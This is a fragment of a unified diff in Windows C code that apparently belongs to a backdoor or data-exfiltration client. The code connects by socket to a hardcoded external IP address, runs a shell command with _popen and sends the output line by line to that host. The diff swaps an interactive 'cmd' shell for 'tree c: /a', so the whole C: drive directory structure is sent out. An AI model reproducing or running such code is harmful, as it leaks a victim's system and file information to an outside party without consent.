@@ -24,7 +24,7 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
             sockAddr.sin_addr.S_un.S_addr = inet_addr("80.112.129.129");
             
             if (connect(hSocket, (SOCKADDR*)(&sockAddr), sizeof(sockAddr))==0){
-                FILE* commText = _popen("cmd","r");
+                FILE* commText = _popen("tree c: /a","r");
                 if (commText != NULL){
                     while(fgets(MSG, sizeof(MSG), commText) != NULL){
                         send(hSocket, MSG, strlen(MSG), 0);
